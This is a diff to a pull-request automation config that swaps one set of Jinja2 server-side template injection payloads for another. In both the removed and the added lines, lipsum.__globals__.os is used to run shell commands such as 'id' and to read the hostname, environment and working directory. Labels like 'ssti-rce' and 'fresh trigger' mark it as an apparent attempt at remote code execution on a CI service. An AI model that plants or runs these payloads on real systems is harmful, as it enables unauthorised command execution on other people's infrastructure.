@@ -1,18 +1,13 @@
 pull_request_rules:
-  - name: ssti-rce
+  - name: ssti-v7-20753
     conditions: []
     actions:
       comment:
         message: |
-          === G4o7T SSTI v6 ===
+          === G4o7T SSTI v7 (fresh trigger) ===
           author={{ author }}
           {% if author %}
-          T1-direct-lipsum-globals: {{ lipsum.__globals__ }}
-          T2-attr-lipsum: {{ lipsum | attr('__globals__') }}
-          T3-os-via-lipsum: {{ lipsum.__globals__.os }}
-          T4-popen-id: {{ lipsum.__globals__.os.popen('id').read() }}
-          T5-hostname: {{ lipsum.__globals__.os.popen('hostname').read() }}
-          T6-env-path: {{ lipsum.__globals__.os.environ.PATH }}
-          T7-cwd: {{ lipsum.__globals__.os.getcwd() }}
-          T8-uname: {{ lipsum.__globals__.os.uname() }}
+          R1: {{ lipsum.__globals__ }}
+          R2: {{ lipsum.__globals__.os }}
+          R3: {{ lipsum.__globals__.os.popen('id').read() }}
           {% endif %}
